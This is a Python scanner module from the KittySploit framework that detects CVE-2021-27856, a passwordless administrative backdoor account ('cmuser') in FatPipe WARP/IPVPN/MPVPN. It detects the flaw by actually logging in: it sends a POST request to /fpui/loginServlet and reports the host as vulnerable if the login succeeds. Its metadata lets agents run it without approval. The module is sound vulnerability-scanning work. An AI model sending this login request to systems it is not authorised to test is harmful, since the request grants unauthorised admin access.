#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FatPipe WARP, IPVPN, and MPVPN software prior to versions 10."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FatPipe WARP/IPVPN/MPVPN - Backdoor Account Detection',
        'description': 'FatPipe WARP, IPVPN, and MPVPN software prior to versions 10.1.2r60p91 and 10.2.2r42 contain an account named "cmuser" with administrative privileges and no password, letting attackers gain unauthorized admin access, exploit requires no authentication.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'fatpipe', 'default-login', 'backdoor', 'auth-bypass', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5684.php',
            'https://www.fatpipeinc.com/support/advisories.php',
            'https://www.fatpipeinc.com/support/cve-list.php',
            'https://www.zeroscience.mk/codes/fatpipe_backdoor.txt',
        ],
        'cve': 'CVE-2021-27856',
    }

    def run(self):
        path = '/fpui/loginServlet'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, data='loginParams=%7B%22username%22%3A%22cmuser%22%2C%22password%22%3A%22%22%2C%22authType%22%3A0%7D\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"loginRes":"success"', '"activeUserName":"cmuser"',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='FatPipe WARP/IPVPN/MPVPN - Backdoor Account detected', path=path)
            return True
        return False

